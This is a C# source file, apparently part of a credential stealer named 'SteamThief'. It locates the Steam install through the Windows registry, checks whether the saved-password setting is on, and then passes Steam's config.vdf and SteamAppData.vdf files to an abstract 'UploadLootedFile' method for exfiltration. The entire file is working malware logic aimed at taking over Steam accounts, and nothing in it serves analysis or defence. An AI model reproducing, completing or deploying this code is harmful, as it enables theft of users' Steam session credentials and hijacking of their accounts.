using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace SteamThief
{
    public abstract class SteamThief
    {
        public const string SteamAppData = "SteamAppData.vdf";
        public const string SteamConfig = "config.vdf";

        private string getSteamInstallPath()
        {
            RegistryKey regKey = Registry.CurrentUser;
            regKey = regKey.OpenSubKey(@"Software\Valve\Steam");

            if (regKey != null)
                return regKey.GetValue("SteamPath").ToString();

            return "";
        }
        
        public abstract void UploadLootedFile(byte[] Data, string FileName);

        public bool Collect()
        {
            string SteamPath = getSteamInstallPath();
            string SteamConfigPath = Path.Combine(SteamPath, "config").Replace(@"/", "\\");
            string ConfigPath = Path.Combine(SteamConfigPath, SteamConfig);
            string AppDataPath = Path.Combine(SteamConfigPath, SteamAppData);
            if(File.Exists(ConfigPath) && File.Exists(AppDataPath)) {
                string SteamAppDataContent = File.ReadAllText(AppDataPath);
                if(Regex.IsMatch(SteamAppDataContent, @"RememberPassword\W*\""1\""")) {
                    UploadLootedFile(File.ReadAllBytes(AppDataPath), SteamAppData);
                    UploadLootedFile(File.ReadAllBytes(ConfigPath), SteamConfig);
                    return true;
                }
                return false;
            }
            else return false;
        }
    }
}
